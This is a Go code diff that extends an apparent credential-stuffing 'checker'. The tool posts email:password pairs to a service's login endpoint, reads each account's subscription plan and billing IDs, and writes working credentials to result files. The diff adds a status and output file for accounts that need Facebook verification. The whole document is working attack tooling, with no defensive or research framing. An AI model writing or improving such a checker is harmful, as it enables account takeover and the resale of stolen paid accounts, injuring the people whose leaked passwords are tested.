@@ -20,10 +20,11 @@ import (
 type CheckStatus string
 
 const (
-	StatusHit          CheckStatus = "HIT"
-	StatusFail         CheckStatus = "FAIL"
-	StatusError        CheckStatus = "ERROR"
-	StatusRateLimited  CheckStatus = "RATE_LIMITED"
+	StatusHit            CheckStatus = "HIT"
+	StatusFail           CheckStatus = "FAIL"
+	StatusError          CheckStatus = "ERROR"
+	StatusRateLimited    CheckStatus = "RATE_LIMITED"
+	StatusVerifyRequired CheckStatus = "VERIFY_REQUIRED"
 )
 
 type CheckResult struct {
@@ -144,7 +145,7 @@ func (c *Checker) Check(email, password string) CheckResult {
 
 	// Step 2: POST login
 	postBody := fmt.Sprintf(`{"email":%s,"password":%s}`, jsonString(email), jsonString(password))
-	postRespBody, postStatus, err := c.doRequest(client, "POST", c.cfg.LoginURL(), map[string]string{
+	postRespBody, postStatus, postHeaders, err := c.doRequest(client, "POST", c.cfg.LoginURL(), map[string]string{
 		"Accept":            "text/html, application/xhtml+xml",
 		"Accept-Language":   "en-US,en;q=0.9",
 		"Content-Type":      "application/json",
@@ -188,8 +189,15 @@ func (c *Checker) Check(email, password string) CheckResult {
 		return result
 	}
 
+	if c.loginNeedsFacebookVerify(client, postRespBody, postHeaders) {
+		c.enrichPlanFromAccount(client, &result)
+		result.Status = StatusVerifyRequired
+		result.Reason = "Facebook verification required"
+		return result
+	}
+
 	// Step 3: GET account query (plan info)
-	accountBody, accountStatus, err := c.doRequest(client, "GET", c.cfg.AccountQueryURL(), map[string]string{
+	accountBody, accountStatus, _, err := c.doRequest(client, "GET", c.cfg.AccountQueryURL(), map[string]string{
 		"Accept":            "application/json, text/plain, */*",
 		"Accept-Language":   "en-US,en;q=0.9",
 		"Cache-Control":     "no-cache",
@@ -226,7 +234,7 @@ func (c *Checker) Check(email, password string) CheckResult {
 
 	if result.PlanName == "" {
 		// Optional backup: segment traits
-		segBody, segStatus, segErr := c.doRequest(client, "GET", c.cfg.SegmentTraitsURL(), map[string]string{
+		segBody, segStatus, _, segErr := c.doRequest(client, "GET", c.cfg.SegmentTraitsURL(), map[string]string{
 			"Accept":           "application/json, text/plain, */*",
 			"Cache-Control":    "no-cache",
 			"Referer":          c.cfg.BaseURL() + "/",
@@ -249,26 +257,33 @@ func (c *Checker) Check(email, password string) CheckResult {
 		return result
 	}
 
+	if c.sessionRequiresFacebookVerify(client) {
+		result.PlanLabel = classifyPlan(c.cfg, result)
+		result.Status = StatusVerifyRequired
+		result.Reason = "Facebook verification required"
+		return result
+	}
+
 	result.PlanLabel = classifyPlan(c.cfg, result)
 	result.Status = StatusHit
 	return result
 }
 
-func (c *Checker) doRequest(client *http.Client, method, rawURL string, headers map[string]string, body string) (string, int, error) {
+func (c *Checker) doRequest(client *http.Client, method, rawURL string, headers map[string]string, body string) (string, int, http.Header, error) {
 	var bodyReader io.Reader
 	if body != "" {
 		bodyReader = strings.NewReader(body)
 	}
 	req, err := http.NewRequest(method, rawURL, bodyReader)
 	if err != nil {
-		return "", 0, err
+		return "", 0, nil, err
 	}
 	for k, v := range headers {
 		req.Header.Set(k, v)
 	}
 	resp, err := client.Do(req)
 	if err != nil {
-		return "", 0, err
+		return "", 0, nil, err
 	}
 	defer resp.Body.Close()
 
@@ -276,7 +291,7 @@ func (c *Checker) doRequest(client *http.Client, method, rawURL string, headers 
 	if resp.Header.Get("Content-Encoding") == "gzip" {
 		gz, err := gzip.NewReader(resp.Body)
 		if err != nil {
-			return "", resp.StatusCode, err
+			return "", resp.StatusCode, resp.Header, err
 		}
 		defer gz.Close()
 		reader = gz
@@ -284,9 +299,9 @@ func (c *Checker) doRequest(client *http.Client, method, rawURL string, headers 
 
 	data, err := io.ReadAll(io.LimitReader(reader, 2<<20))
 	if err != nil {
-		return "", resp.StatusCode, err
+		return "", resp.StatusCode, resp.Header, err
 	}
-	return string(data), resp.StatusCode, nil
+	return string(data), resp.StatusCode, resp.Header, nil
 }
 
 func (c *Checker) fetchLoginPage(client *http.Client) (string, int, error) {
@@ -298,7 +313,7 @@ func (c *Checker) fetchLoginPage(client *http.Client) (string, int, error) {
 	var status int
 	var err error
 	for attempt := 0; attempt <= retries; attempt++ {
-		body, status, err = c.doRequest(client, "GET", c.cfg.LoginURL(), map[string]string{
+		body, status, _, err = c.doRequest(client, "GET", c.cfg.LoginURL(), map[string]string{
 			"Accept":          "text/html, application/xhtml+xml",
 			"Accept-Language": "en-US,en;q=0.9",
 			"User-Agent":      c.cfg.UserAgent,
@@ -549,6 +564,13 @@ func writeResultFiles(cfg *Config, r CheckResult, resultsDir string) error {
 	case StatusError:
 		line := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
 		return appendLine(filepath.Join(resultsDir, "errors.txt"), line)
+	case StatusVerifyRequired:
+		line := fmt.Sprintf("%s:%s | Facebook verification required", r.Email, r.Password)
+		if r.PlanName != "" {
+			line += fmt.Sprintf(" | Plan=%s | PlanID=%s | Stripe=%s | Label=%s",
+				r.PlanName, r.PlanID, r.StripePlanID, r.PlanLabel)
+		}
+		return appendLine(filepath.Join(resultsDir, "facebook_verify.txt"), line)
 	}
 	return nil
 }
